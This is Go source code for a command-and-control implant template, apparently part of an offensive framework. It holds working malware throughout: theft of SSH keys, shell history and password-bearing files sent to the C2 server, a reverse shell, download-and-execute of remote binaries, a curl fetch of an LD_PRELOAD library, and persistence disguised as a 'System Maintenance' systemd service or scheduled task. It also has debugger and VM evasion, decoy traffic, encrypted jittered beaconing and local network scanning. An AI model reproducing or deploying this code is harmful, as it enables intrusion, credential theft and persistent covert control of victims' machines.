package main

import (
    "bytes"
    "context"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    mathrand "math/rand"
    "io"
    "mime/multipart"
    "net"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "path/filepath"
    "runtime"
    "strconv"
    "strings"
    "time"
    "sync"
    "regexp"
    "bufio"
)

var encryptionCtx *PacketEncryptionContext
var stealthModeEnabled bool 
var iamgroot bool 
var discoveredLiveHosts string
var discoverHostsOnce sync.Once
var results_portscan map[string][]int

const (
    C2_URL     = "https://{lhost}:{lport}"
    CLIENT_ID  = "{line}"
    USERNAME   = "{username}"
    PASSWORD   = "{password}"
    SLEEP      = {sleep} * time.Second
    MALEABLE   = "{maleable}"
    USER_AGENT = "{useragent}"
    MAX_RETRIES = 3
    STEALTH    = "{stealth}"
    LHOST      = "{lhost}"
    DESIRED_LD_PRELOAD = "/dev/shm/mrhyde.so"
)


var USER_AGENTS = []string{
    "{useragent}", 
    "{user_agent_1}",
    "{user_agent_2}",
    "{user_agent_3}",
}

var URLS = []string{
    "{url_trafic_1}",
    "{url_trafic_2}",
    "{url_trafic_3}",
}

var HEADERS = map[string]string{
    "Accept":       "application/json",
    "Content-Type": "application/json",
    "Connection":   "keep-alive",
}

var debugTools = map[string][]string{
    "windows": {"x64dbg", "ollydbg", "ida", "windbg", "processhacker"},
    "linux":   {"gdb", "strace", "ltrace", "radare2"},
    "darwin":  {"lldb", "dtrace", "instruments"},
}

type Aes256Key struct {
    Key []byte
}

type PacketEncryptionContext struct {
    AesKey  *Aes256Key
    Valid   bool
    Enabled bool
}
type LazyDataType struct {
	ReverseShellPort int `json:"reverse_shell_port"`
    Rhost string `json:"rhost"`
    DebugImplant string `json:"enable_c2_implant_debug"`
}

type HostResult struct {
	IP      string
	Alive   bool
	Interface string
}

func downloadAndExecute(ctx context.Context, fileURL string, lazyconf LazyDataType) {
	go func() {
		defer globalRecover()

		if runtime.GOOS == "windows" {
			if lazyconf.DebugImplant == "True" {
				fmt.Println("[WARNING] Downloading and executing to /dev/shm is not applicable on Windows.")
			}
			return
		}

		tmpDir := "/dev/shm"
		fileName := filepath.Base(fileURL)
		filePath := filepath.Join(tmpDir, fileName)

		client := http.Client{
			Timeout: 30 * time.Second,
		}

		req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
		if err != nil {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Error creating download request for %s: %v\n", fileURL, err)
			}
			return
		}

		resp, err := client.Do(req)
		if err != nil {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Error downloading file from %s: %v\n", fileURL, err)
			}
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Failed to download file from %s, status code: %d\n", fileURL, resp.StatusCode)
			}
			return
		}

		file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
		if err != nil {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Error opening file %s: %v\n", filePath, err)
			}
			return
		}
		defer file.Close()

		_, err = io.Copy(file, resp.Body)
		if err != nil {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Error saving file to %s: %v\n", filePath, err)
			}
			return
		}

		cmd := exec.Command(filePath)

		// cmd.Stdout = os.Stdout
		// cmd.Stderr = os.Stderr

		if err := cmd.Start(); err != nil {
			if lazyconf.DebugImplant == "True" {
				fmt.Printf("[ERROR] Error starting executable %s: %v\n", filePath, err)
			}
			return
		}

		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[INFO] Background process started: %s\n", filePath)
		}
	}()
}

func handleExfiltrate(ctx context.Context, command string, lazyconf LazyDataType) {
	if lazyconf.DebugImplant == "True" {
		fmt.Println("[INFO] Executing file scraping...")
	}

	userObj, err := user.Current()
	if err != nil {
		fmt.Printf("[ERROR] Could not get current user: %v\n", err)
		return
	}
	homeDir := userObj.HomeDir

	sensitiveFiles := []string{
		filepath.Join(homeDir, ".bash_history"),
		filepath.Join(homeDir, ".ssh", "id_rsa"),
		filepath.Join(homeDir, ".ssh", "id_dsa"),
		filepath.Join(homeDir, ".ssh", "id_ecdsa"),
		filepath.Join(homeDir, ".ssh", "id_ed25519"),
		filepath.Join(homeDir, "Desktop", "*.log"), 
	}

	passwordPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)password\s*[:=]\s*"?(.+?)"?\s*$`),
		regexp.MustCompile(`(?i)passwd\s*[:=]\s*"?(.+?)"?\s*$`),

	}

	var wg sync.WaitGroup
	foundFilesChan := make(chan string, 10)
	errorChan := make(chan error, 5)

	scanPath := func(path string) {
		defer wg.Done()
		if strings.Contains(path, "*") {
			matches, err := filepath.Glob(path)
			if err != nil {
				errorChan <- fmt.Errorf("error processing glob pattern '%s': %v", path, err)
				return
			}
			for _, match := range matches {
				if isSensitiveFile(match, passwordPatterns) {
					foundFilesChan <- match
				}
			}
		} else {
			if isSensitiveFile(path, passwordPatterns) {
				foundFilesChan <- path
			}
		}
	}

	for _, file := range sensitiveFiles {
		wg.Add(1)
		go scanPath(file)
	}

	go func() {
		wg.Wait()
		close(foundFilesChan)
		close(errorChan)
	}()

	for foundFile := range foundFilesChan {
		if lazyconf.DebugImplant == "True" {
			fmt.Printf("[INFO] Found potentially sensitive file: %s\n", foundFile)
		}
		uploadFile(ctx, foundFile)
	}

	for err := range errorChan {
		fmt.Printf("[ERROR] Error during file scraping: %v\n", err)
	}

	if lazyconf.DebugImplant == "True" {
		fmt.Println("[INFO] File scraping finished.")
	}
}

func isSensitiveFile(path string, passwordPatterns []*regexp.Regexp) bool {
	fileInfo, err := os.Stat(path)
	if err != nil || fileInfo.IsDir() {
		return false
	}

	filename := filepath.Base(path)
	if strings.Contains(filename, "id_rsa") || strings.Contains(filename, "id_dsa") ||
		strings.Contains(filename, "id_ecdsa") || strings.Contains(filename, "id_ed25519") ||
		filename == ".bash_history" {
		return true
	}

	file, err := os.Open(path)
	if err != nil {
		fmt.Printf("[WARNING] Could not open file '%s' for password scanning: %v\n", path, err)
		return false
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		for _, pattern := range passwordPatterns {
			if pattern.MatchString(line) {
				return true
			}
		}
	}
	return false
}

func uploadFile(ctx context.Context, filePath string) {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		fmt.Printf("[WARNING] File not found for upload: %s\n", filePath)
		return
	}
	if _, err := retryRequest(ctx, C2_URL+MALEABLE+"/upload", "POST", "", filePath); err != nil {
		fmt.Printf("[ERROR] Failed to upload file '%s': %v\n", filePath, err)
	} else {
		fmt.Printf("[INFO] Successfully uploaded file: %s\n", filepath.Base(filePath))
	}
}


func PortScanner(ips string, ports []int, timeout time.Duration) map[string][]int {
	ipList := strings.Split(strings.ReplaceAll(ips, " ", ""), ",")
	results := make(map[string][]int)
	var mu sync.Mutex
	var wg sync.WaitGroup
	resultChan := make(chan struct {
		ip    string
		port  int
		open  bool
	}, 100)
	scan := func(ip string, port int) {
		defer wg.Done()
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), timeout)
		if err == nil {
			conn.Close()
			resultChan <- struct {
				ip    string
				port  int
				open  bool
			}{ip, port, true}
		} else {
			resultChan <- struct {
				ip    string
				port  int
				open  bool
			}{ip, port, false}
		}
	}
	for _, ip := range ipList {
		for _, port := range ports {
			wg.Add(1)
			go scan(ip, port)
		}
	}
	go func() {
		wg.Wait()
		close(resultChan)
	}()
	for res := range resultChan {
		if res.open {
			mu.Lock()
			results[res.ip] = append(results[res.ip], res.port)
			mu.Unlock()
		}
	}

	return results
}

func isRoot() bool {
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		return os.Getuid() == 0
	}
	return false
}

func pingHost(ip, iface string, timeout time.Duration, results chan<- HostResult, wg *sync.WaitGroup) {
	defer wg.Done()

	cmd := exec.Command("ping", "-c", "1", "-W", fmt.Sprintf("%d", int(timeout.Seconds())), ip)
	err := cmd.Run()

	results <- HostResult{IP: ip, Alive: err == nil, Interface: iface}
}

func generateIPRange(ipNet *net.IPNet) ([]string, error) {
	var ips []string
	ip := ipNet.IP.To4()
	mask := ipNet.Mask

	start := ipToInt(ip)
	ones, _ := mask.Size()
	numIPs := 1 << (32 - ones) 

	for i := uint32(0); i < uint32(numIPs); i++ {
		ips = append(ips, intToIP(start+i).String())
	}
	return ips, nil
}

func ipToInt(ip net.IP) uint32 {
	ip = ip.To4()
	return uint32(ip[0])<<24 | uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
}

func intToIP(n uint32) net.IP {
	return net.IPv4(byte(n>>24), byte(n>>16), byte(n>>8), byte(n))
}

func ReadJSONFromURL(url string, target interface{}) error {
	client := http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	response, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("error GET a %s: %w", url, err)
	}
	defer response.Body.Close()

	if response.StatusCode < http.StatusOK || response.StatusCode >= http.StatusBadRequest {
		bodyBytes, _ := io.ReadAll(response.Body)
		return fmt.Errorf("Request %s error code: %d: %s", url, response.StatusCode, string(bodyBytes))
	}

	err = json.NewDecoder(response.Body).Decode(target)
	if err != nil {
		return fmt.Errorf("Error decode JSON de %s: %w", url, err)
	}
	return nil
}

func discoverLocalHosts(lazyconf LazyDataType) {
	var liveHosts []string
	timeout := 2 * time.Second
	results := make(chan HostResult)
	var wg sync.WaitGroup
    var rhost string
	rhost = lazyconf.Rhost
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range interfaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
    
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					ipNet, ok := addr.(*net.IPNet)
					if ok && ipNet.IP.To4() != nil {
						subnetIPs, err := generateIPRange(ipNet)
						if err == nil {
							for _, ip := range subnetIPs {
								wg.Add(1)
								go pingHost(ip, iface.Name, timeout, results, &wg)
							}
						}
					}
				}
			}
		}
        wg.Add(1)
        go pingHost(rhost, "tun0", timeout, results, &wg)
		go func() {
			wg.Wait()
			close(results)
		}()

		for result := range results {
			if result.Alive {
                if lazyconf.DebugImplant == "True" {
				    fmt.Printf("[INFO] Discovered Host (Startup): %s en interfaz %s\n", result.IP, result.Interface)
                }
				liveHosts = append(liveHosts, result.IP)
			}
		}
		discoveredLiveHosts = strings.Join(liveHosts, ", ")
	} else {
        if lazyconf.DebugImplant == "True" {
		    fmt.Println("[ERROR] Error obteniendo interfaces para el escaneo de hosts (Startup):", err)
        }
		discoveredLiveHosts = "error"
	}
}

func isVMByMAC() bool {
    interfaces, err := net.Interfaces()
    if err != nil {
        fmt.Println("Error get network interface:", err)
        return false
    }

    vmMACPrefixes := []string{
        "00:05:69", "00:0C:29", "00:50:56", 
        "08:00:27",                        
        "52:54:00",                        
    }

    for _, iface := range interfaces {
        mac := iface.HardwareAddr.String()
        for _, prefix := range vmMACPrefixes {
            if strings.HasPrefix(mac, prefix) {
                return true
            }
        }
    }

    return false
}
func ifRoot(lazyconf LazyDataType) bool {
    if lazyconf.DebugImplant == "True" {
        println("[INFO] Running with root privileges (Linux/macOS)")
    }
    iamgroot = true
    ldPreload := os.Getenv("LD_PRELOAD")
    serv_url := "https://{lhost}/l_{line}"
    baseCtx := context.Background()
	go downloadAndExecute(baseCtx, serv_url, lazyconf)
    if ldPreload == "" || ldPreload != DESIRED_LD_PRELOAD {
        if _, err := os.Stat(DESIRED_LD_PRELOAD); os.IsNotExist(err) {
            cmd := exec.Command("bash", "-c", fmt.Sprintf("curl -o /home/.grisun0/mrhyde.so http://"+LHOST+"/mrhyde.so"))
            cmd.Run()
        }
        os.Setenv("LD_PRELOAD", DESIRED_LD_PRELOAD)
        return true
    }
    return false
}
func checkDebuggers(lazyconf LazyDataType) bool {
    var cmd string
    switch runtime.GOOS {
    case "windows":
        cmd = "tasklist"
    case "linux", "darwin":
        cmd = "ps aux"
        if isRoot() {
            ifRoot(lazyconf)
        } else {
            if lazyconf.DebugImplant == "True" {
                println("[INFO] Not running with root privileges (Linux/macOS)")
            }
            iamgroot = false
        }
    default:
        return false
    }

    shellCommand := getShellCommand("-c")
    var args []string
    if len(shellCommand) > 1 {
        args = append(args, shellCommand[1]) 
    }
    args = append(args, cmd) 

    out, err := exec.Command(shellCommand[0], args...).Output()
    if err != nil {
        fmt.Println("Error:", err)
        return false
    }

    for _, tool := range debugTools[runtime.GOOS] {
        if strings.Contains(strings.ToLower(string(out)), tool) {
            return true
        }
    }
    return false
}



func initEncryptionContext(keyHex string) *PacketEncryptionContext {
    keyBytes, err := hex.DecodeString(keyHex)
    if err != nil {
        return nil
    }
    return &PacketEncryptionContext{
        AesKey:  &Aes256Key{Key: keyBytes},
        Valid:   true,
        Enabled: true,
    }
}


func initStealthMode(lazyconf LazyDataType) {
    if STEALTH == "True" || STEALTH == "true" {
        stealthModeEnabled = true
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode initialized as ENABLED")
        }
    } else {
        stealthModeEnabled = false
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode initialized as DISABLED")
        }
    }
}


func handleStealthCommand(command string, lazyconf LazyDataType) {
    switch command {
    case "stealth_on":
        stealthModeEnabled = true
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode ENABLED by command")
        }
    case "stealth_off":
        stealthModeEnabled = false
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[INFO] Stealth mode DISABLED by command")
        }
    default:
        
    }
}

func simulateLegitimateTraffic(lazyconf LazyDataType) {
    for {
        userAgent := USER_AGENTS[mathrand.Intn(len(USER_AGENTS))]
        headers := make(http.Header)
        for key, value := range HEADERS {
            headers.Set(key, value)
        }
        headers.Set("User-Agent", userAgent)

        
        url := URLS[mathrand.Intn(len(URLS))]

        
        client := &http.Client{}
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[!] Error creating requests: %v\n", err)
            }
            continue
        }
        req.Header = headers

        resp, err := client.Do(req)
        if err != nil {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[!] Error during simulation: %v\n", err)
            }
            continue
        }
        defer resp.Body.Close()

        if resp.StatusCode == 200 {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[INFO] Simulation success: %s\n", url)
            }
        } else {
            if lazyconf.DebugImplant == "True" {
                fmt.Printf("[-] Error in the matrix: %d\n", resp.StatusCode)
            }
        }
        
        time.Sleep(time.Duration(mathrand.Intn(31)+30) * time.Second)
    }
}

func globalRecover() {
    if r := recover(); r != nil {
        fmt.Printf("[RECOVER] Critical error: %v\n", r)
        restartClient()
    }
}

func restartClient() {
    executable, _ := os.Executable()
    cmd := exec.Command(executable)
    cmd.Start()
    os.Exit(1)
}

func ensurePersistence(lazyconf LazyDataType) error {
    executable, err := os.Executable()
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            return fmt.Errorf("failed to get executable path: %w", err)
        }
    }

    
    if runtime.GOOS == "windows" {
        taskName := 'S' + 'y' + 's' + 't' + 'e' + 'm' + 'M' + 'a' + 'i' + 'n' + 't'+ 'e' + 'n' + 'a' + 'n' + 'c' + 'e' + 'T' + 'a' + 's' + 'k'
        taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, string(taskName), executable)
        return exec.Command("cmd", "/C", taskCmd).Run()
    }

    
    if runtime.GOOS == "linux" {
        serviceContent := fmt.Sprintf(`
[Unit]
Description=System Maintenance Service

[Service]
ExecStart=%s
Restart=always
User=%s

[Install]
WantedBy=multi-user.target
`, executable, os.Getenv("USER"))

        servicePath := "/et"+"c/sy"+"ste"+"md/sy"+"stem/"+"syst"+"em-maint"+"enance.service"
        err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
        if err != nil {
            return err
        }
        return exec.Command("systemctl", "enable", "system-maintenance").Run()
    }

    return nil
}

func EncryptPacket(ctx *PacketEncryptionContext, packet []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }

    iv := make([]byte, aes.BlockSize)
    if _, err := rand.Read(iv); err != nil {
        return nil, err
    }

    encryptedData := make([]byte, aes.BlockSize+len(packet))
    copy(encryptedData, iv)

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(encryptedData[aes.BlockSize:], packet)

    return encryptedData, nil
}

func SendShell(ip string, port int) {
	target := fmt.Sprintf("%s:%d", ip, port)
	con, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Error al conectar a", target, ":", err)
		return
	}
	defer con.Close()

	shellCommand := getShellCommand("-i")
	var args []string
	if len(shellCommand) > 1 {
		args = append(args, shellCommand[1])
	}
	cmd := exec.Command(shellCommand[0], args...)
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	err = cmd.Run()
	if err != nil {
		fmt.Println("Error al ejecutar el comando shell en", target, ":", err)
		return
	}
}

func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, error) {
    block, err := aes.NewCipher(ctx.AesKey.Key)
    if err != nil {
        return nil, err
    }

    if len(encryptedData) < aes.BlockSize {
        return nil, errors.New("encrypted data too short")
    }

    iv := encryptedData[:aes.BlockSize]
    encryptedData = encryptedData[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(encryptedData, encryptedData)

    return encryptedData, nil
}

func sendRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   30 * time.Second,
    }

    var req *http.Request
    var err error

    if filePath != "" {
        file, err := os.Open(filePath)
        if err != nil {
            return nil, fmt.Errorf("file open error: %w", err)
        }
        defer file.Close()

        bodyBuffer := &bytes.Buffer{}
        writer := multipart.NewWriter(bodyBuffer)
        part, err := writer.CreateFormFile("file", filepath.Base(filePath))
        if err != nil {
            return nil, fmt.Errorf("multipart create error: %w", err)
        }

        if _, err = io.Copy(part, file); err != nil {
            return nil, fmt.Errorf("file copy error: %w", err)
        }
        writer.Close()

        req, err = http.NewRequestWithContext(ctx, method, url, bodyBuffer)
        if err != nil {
            return nil, fmt.Errorf("request creation error: %w", err)
        }
        req.Header.Set("Content-Type", writer.FormDataContentType())
    } else {
        encryptedBody, err := EncryptPacket(encryptionCtx, []byte(body))
        if err != nil {
            return nil, fmt.Errorf("encryption error: %w", err)
        }
        base64Body := base64.StdEncoding.EncodeToString(encryptedBody)
        req, err = http.NewRequestWithContext(ctx, method, url, strings.NewReader(base64Body))
        if err != nil {
            return nil, fmt.Errorf("request creation error: %w", err)
        }
        req.Header.Set("Content-Type", "text/plain")
    }

    //req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(USERNAME+":"+PASSWORD)))
    userAgent := USER_AGENTS[mathrand.Intn(len(USER_AGENTS))]
    req.Header.Set("User-Agent", userAgent)

    resp, err := client.Do(req)
    if err != nil {
        return nil, fmt.Errorf("request failed: %w", err)
    }

    if resp.StatusCode != http.StatusOK {
        defer resp.Body.Close()
        errorBody, _ := io.ReadAll(resp.Body)
        return nil, fmt.Errorf("server error %d: %s", resp.StatusCode, string(errorBody))
    }

    if resp.Body != nil {
        defer resp.Body.Close()
        rawResponse, err := io.ReadAll(resp.Body)
        if err != nil {
            return nil, fmt.Errorf("response read error: %w", err)
        }

        encryptedResponse, err := base64.StdEncoding.DecodeString(string(rawResponse))


        decryptedResponse, err := DecryptPacket(encryptionCtx, encryptedResponse)
        if err != nil {
            return nil, fmt.Errorf("decryption error: %w", err)
        }

        resp.Body = io.NopCloser(bytes.NewReader(decryptedResponse))
    }

    return resp, nil
}

func retryRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
    for i := 0; i < MAX_RETRIES; i++ {
        resp, err := sendRequest(ctx, url, method, body, filePath)
        if err == nil {
            return resp, nil
        }
        fmt.Printf("[RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
        select {
        case <-ctx.Done():
            return nil, ctx.Err()
        case <-time.After(SLEEP):
        }
    }
    return nil, fmt.Errorf("max retries reached")
}

func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()

    for i := 0; i < MAX_RETRIES; i++ {
        cmd := exec.CommandContext(ctx, shellCommand[0], shellCommand[1], command)
        var out bytes.Buffer
        cmd.Stdout = &out
        cmd.Stderr = &out

        err := cmd.Run()
        if err == nil {
            return out.String(), nil
        }

        fmt.Printf("[CMD RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
        time.Sleep(2 * time.Second)
    }
    return "", fmt.Errorf("command failed after %d attempts", MAX_RETRIES)
}

func getShellCommand(interactive string) []string {
    osName := runtime.GOOS
    switch osName {
    case "windows":
        if _, err := exec.LookPath("powershell"); err == nil {
            return []string{"powershell", "-Command"}
        }
        return []string{"cmd", "/C"}
    case "linux", "darwin":
        if _, err := exec.LookPath("bash"); err == nil {
            return []string{"bash", interactive}
        }
        return []string{"sh", "-c"}
    default:
        return []string{"sh", "-c"}
    }
}

func calculateJitteredSleep(baseSleep time.Duration, minJitterPercentage, maxJitterPercentage float64) time.Duration {
	jitterPercentage := minJitterPercentage + mathrand.Float64()*(maxJitterPercentage-minJitterPercentage)
	jitterRange := time.Duration(float64(baseSleep) * jitterPercentage)
	jitter := time.Duration(mathrand.Float64() * float64(jitterRange))
	jitteredSleep := baseSleep + jitter
	return jitteredSleep
}

func main() {
    defer globalRecover()
	mathrand.Seed(time.Now().UnixNano())
	baseSleepTime := SLEEP
	minJitterPercentage := 0.1
	maxJitterPercentage := 0.3
    keyHex := "{key}"
    var lazyconf LazyDataType
    var currentPortScanResults map[string][]int
    url := C2_URL + "/config.json"
    
    err := ReadJSONFromURL(url, &lazyconf)
	if err != nil {
        fmt.Println("Error:", err)
		return
	}
    if lazyconf.DebugImplant == "True" {
        fmt.Println("[INFO] Reading JSON from URL:", url)
    }
    initStealthMode(lazyconf)

    encryptionCtx = initEncryptionContext(keyHex)
    if encryptionCtx == nil {
        if lazyconf.DebugImplant == "True" {
            fmt.Println("[FATAL] Failed to initialize encryption")
        }
        time.Sleep(30 * time.Second)
        restartClient()
    }

    shellCommand := getShellCommand("-c")
    baseCtx := context.Background()
    ensurePersistence(lazyconf)
    for {
        func() {        
            defer globalRecover()
            
            ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
            defer cancel()

            resp, err := retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "GET", "", "")
            if err != nil {
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[ERROR] Main request failed: %v\n", err)
                }
                return
            }

            body, err := io.ReadAll(resp.Body)
            if err != nil {
                if lazyconf.DebugImplant == "True" {
                    fmt.Printf("[ERROR] Failed to read response: %v\n", err)
                }
                return
            }

            command := strings.TrimSpace(string(body))
            if command == "" {
                return
            }
            
            handleStealthCommand(command, lazyconf)
            if stealthModeEnabled {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[DEBUG] Stealth mode is active. Skipping activity.")
                }
                return
            }   
            if lazyconf.DebugImplant == "True" {
                fmt.Println("[INFO] Simulation Started...")
            }
            go simulateLegitimateTraffic(lazyconf)
            if lazyconf.DebugImplant == "True" {
                fmt.Println("[INFO] Execution Simulation.")
            }
            if checkDebuggers(lazyconf) {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[INFO] We are under debugger")
                }
            } else {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[INFO] We aren't under debugger.")
                }
            }

            if isVMByMAC() {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[INFO] This is a VM")
                }
            } else {
                if lazyconf.DebugImplant == "True" {
                    fmt.Println("[INFO] This is not a VM")
                }
            }   
                        
            if !strings.Contains(command, "stealth") {
                switch {
                case strings.HasPrefix(command, "download:"):
                    handleDownload(ctx, command)
                case strings.HasPrefix(command, "upload:"):
                    handleUpload(ctx, command)
                case strings.HasPrefix(command, "rev:"):
                    go SendShell(LHOST, lazyconf.ReverseShellPort)
                case strings.HasPrefix(command, "exfil:"):
					handleExfiltrate(ctx, command, lazyconf)
                case strings.HasPrefix(command, "download_exec:"):
                    url := strings.TrimPrefix(command, "download_exec:")
                    go downloadAndExecute(ctx, url, lazyconf)                    
                case strings.HasPrefix(command, "discover:"):
	                go discoverHostsOnce.Do(func() {
                        discoverLocalHosts(lazyconf)
                    })
                case strings.HasPrefix(command, "portscan:"):
                    ports := []int{22, 80, 443, 8080}
                    timeout := 2 * time.Second
                    currentPortScanResults = PortScanner(discoveredLiveHosts, ports, timeout) 
                    results_portscan = currentPortScanResults
                    for ip, openPorts := range currentPortScanResults {
                        if len(openPorts) > 0 {
                            if lazyconf.DebugImplant == "True" {
                                fmt.Printf("IP%s has open ports: %v\n", ip, openPorts)
                            }
                        } else {
                            if lazyconf.DebugImplant == "True" {
                                fmt.Printf("IP%s has no open ports\n", ip)
                            }
                        }
                    }
                case strings.Contains(command, "terminate"):
                    if lazyconf.DebugImplant == "True" {
                        fmt.Println("[INFO] terminate command")
                    }
                    os.Exit(0)
                default:
                    handleCommand(ctx, command, shellCommand, lazyconf, currentPortScanResults)
                }
            }

        }()
		sleepTime := calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
		time.Sleep(sleepTime)
    }
}

func handleDownload(ctx context.Context, command string) {
    defer globalRecover()
    filePath := strings.TrimPrefix(command, "download:")
    fileURL := C2_URL + MALEABLE + "/download/" + filePath

    resp, err := retryRequest(ctx, fileURL, "GET", "", "")
    if err != nil {
        fmt.Printf("[ERROR] Download failed: %v\n", err)
        return
    }

    fileData, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("[ERROR] Failed to read downloaded file: %v\n", err)
        return
    }

    err = os.WriteFile(filepath.Base(filePath), fileData, 0644)
    if err != nil {
        fmt.Printf("[ERROR] Failed to write file: %v\n", err)
    }
}

func handleUpload(ctx context.Context, command string) {
    defer globalRecover()
    filePath := strings.TrimPrefix(command, "upload:")
    resp, err := retryRequest(ctx, C2_URL+MALEABLE+"/upload", "POST", "", filePath)
    if err != nil {
        fmt.Printf("[ERROR] Upload failed: %v\n", err)
        return
    }
    
    if resp.StatusCode != http.StatusOK {
        fmt.Printf("[ERROR] Upload failed with status: %d\n", resp.StatusCode)
    }
}

func handleCommand(ctx context.Context, command string, shellCommand []string, lazyconf LazyDataType, resultadosEscaneo map[string][]int) {
    defer globalRecover()
    output, err := executeCommandWithRetry(shellCommand, command)
    if err != nil {
        if lazyconf.DebugImplant == "True" {
            output = fmt.Sprintf("Command execution error: %v", err)
        }
    }

    pid := os.Getpid()
    hostname, _ := os.Hostname()
    ips := getIPs()
    currentUser, _ := user.Current()

    jsonData, _ := json.Marshal(map[string]interface{}{
        "output":          output,
        "client":          runtime.GOOS,
        "command":         command,
        "pid":             strconv.Itoa(pid),
        "hostname":        hostname,
        "ips":             strings.Join(ips, ", "),
        "user":            currentUser.Username,
        "discovered_ips":  discoveredLiveHosts,
        "result_portscan": resultadosEscaneo,
    })
    var prettyJSON bytes.Buffer
    json.Indent(&prettyJSON, jsonData, "", "  ") // Usar dos espacios para indentar
    if lazyconf.DebugImplant == "True" {
        fmt.Println("JSON Data (Formatted):")
        fmt.Println(prettyJSON.String())
    }
    retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
}

func getIPs() []string {
    var ips []string
    addrs, _ := net.InterfaceAddrs()
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
            ips = append(ips, ipnet.IP.String())
        }
    }
    return ips
}